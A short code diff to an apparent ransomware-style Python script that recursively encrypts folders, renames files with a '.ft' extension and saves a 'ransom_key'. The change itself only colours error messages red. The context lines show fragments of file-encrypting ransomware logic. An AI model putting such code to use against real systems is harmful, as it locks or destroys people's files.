@@ -32,7 +32,7 @@ def encryptFolder(path,key):
                     log(f"\33[94mRenaming file to : {file + '.ft'}\33[0m")
                     os.rename(file,file + '.ft')
     except Exception as e:
-        log(f"Error: {e}")
+        log(f"\33[31mError: {e}\33[0m")
     for folder in dirs_only:
         encryptFolder(folder,key)
 
@@ -64,7 +64,7 @@ def decryptFolder(path,key):
                 log(f"\33[94mRenaming file to : {file[:-3]}\33[0m")
                 os.rename(file,file[:-3])
     except Exception as e:
-        log(f"Error: {e}")
+        log(f"\33[31mError: {e}\33[0m")
     for folder in dirs_only:
         decryptFolder(folder,key)
 
@@ -102,9 +102,9 @@ if __name__ == '__main__':
             log("Key saved in 'ransom_key', \33[91m(IF YOU LOSE THE KEY, YOU WON'T BE ABLE TO DECRYPT YOUR FILES)\33[0m")
             encryptFolder(folder,key)
         except Exception as e:
-            log(f"Error: {e}")
+            log(f"\33[31mError: {e}\33[0m")
     else:
         try:
             decryptFolder(folder,args.r)
         except Exception as e:
-            log(f"Error: {e}")
+            log(f"\33[31mError: {e}\33[0m")
